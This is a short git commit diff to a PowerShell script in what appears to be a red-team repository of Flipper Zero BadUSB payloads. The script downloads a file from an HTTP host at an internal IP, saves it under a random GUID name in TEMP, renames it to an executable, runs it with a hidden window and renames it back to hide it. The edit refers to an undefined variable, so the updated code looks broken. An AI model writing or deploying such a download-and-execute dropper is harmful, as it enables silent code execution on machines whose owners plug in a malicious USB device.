6ef6980beaf1ecc4b8ae0b0b2c8a96411ea7a84c
Your Name <you@example.com>
2025-11-22 20:06:00 +0100

    upd

--- red-team-ops/flipper-zero/bad-usb/shells/download.ps1
+++ red-team-ops/flipper-zero/bad-usb/shells/download.ps1
@@ -1,5 +1,9 @@
 $url  = "http://172.16.41.1:8000/config.tmp"
-$dest = "$env:TEMP\config.exe"
+$dest = "$env:TEMP\2fd19d11-d4b7-46d1-94db-7edd16980d15.tmp"
+$exe  = "$env:TEMP\2fd19d11-d4b7-46d1-94db-7edd16980d15.exe"
+
 Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
 
-Start-Process "C:\Users\test\AppData\Local\Temp\config.exe" -WindowStyle Hidden
+Move-Item -Path $tmp -Destination $exe -Force
+Start-Process $exe -WindowStyle Hidden
+Move-Item -Path $exe -Destination $tmp -Force
